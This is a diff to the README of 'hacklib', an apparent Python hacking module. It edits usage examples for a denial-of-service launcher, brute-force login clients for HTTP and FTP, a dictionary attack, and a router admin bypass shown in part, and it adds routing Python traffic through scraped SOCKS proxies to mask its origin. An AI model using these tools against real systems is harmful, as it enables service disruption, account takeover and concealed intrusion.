@@ -6,7 +6,7 @@ hacklib is a Python module for hacking enthusiasts interested in network securit
 
 #### Examples of Usage
 -
-Multi-threaded Denial of Service (DOS) Stress-Testing:
+Multi-threaded Denial of Service (DOS) stress-testing:
 ```python
 import hacklib
 
@@ -15,7 +15,7 @@ dos = hacklib.DOSer()
 dos.launch('127.0.0.1', duration=30, threads=50)
 ```
 -
-Universal Login for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:
+Universal login client for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:
 
 ```python
 import hacklib
@@ -25,13 +25,15 @@ ac = hacklib.AuthClient()
 htmldata = ac.login('https://gmail.com', 'email', 'password')
 
 # Returns HTML whether login works or not.
-# If resulting URL is the same, assumes failure and returns False.
-if htmldata and 'Inbox' in htmldata:
-    print 'Login Success'
+try:
+    if 'Inbox' in htmldata: print 'Login Success.'
+    else: print 'Login Failed.'
+except: print 'Couldn't even connect. :('
 
-# For logins using HTTP Basic Auth, just check boolean:
-#if htmldata:
-#    print 'Login Success'
+# For logins using HTTP Basic Auth:
+try: 
+    htmldata = ac.login('http://somewebsite.com', 'admin', 'password')
+except: pass #login failed
 ```
 Simple Dictionary Attack using AuthClient:
 ```python
@@ -90,7 +92,7 @@ Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
 # The router's admin page is now fully accessible from any web browser.
 ```
 -
-FTP Authentication:
+FTP authentication:
 ```python
 import hacklib
 ftp = hacklib.FTPAuth('127.0.0.1', 21)
@@ -98,4 +100,30 @@ try:
     ftp.login('username', 'password')
 except:
     print 'Login failed.'
+```
+-
+Socks4/5 proxy scraping and tunneling
+```python
+>>> import hacklib
+>>> import urllib2
+# Scrape recently added Socks proxies from the internet
+>>> proxylist = hacklib.getProxies()
+>>> proxy = hacklib.Proxy()
+# Automatically find and connect to a working proxy in proxylist
+>>> proxy.connect(proxylist)
+>>> proxy.IP
+u'41.203.214.58'
+>>> proxy.port
+65000
+>>> proxy.country
+u'KE'
+# All Python network activity across all modules are routed through proxy
+>>> urllib2.urlopen('http://icanhazip.com/').read()
+'41.203.214.58\n'
+# Notes: Only network activity via Python masked by the proxy.
+# Network activity on other programs remain unmasked.
+```
+Filter proxies by 
+# Filtering proxies by country and type:
+# proxylist = hacklib.getProxies(country_filter = ('RU', 'CA', 'SE'), proxy_type='Socks5'
 ```
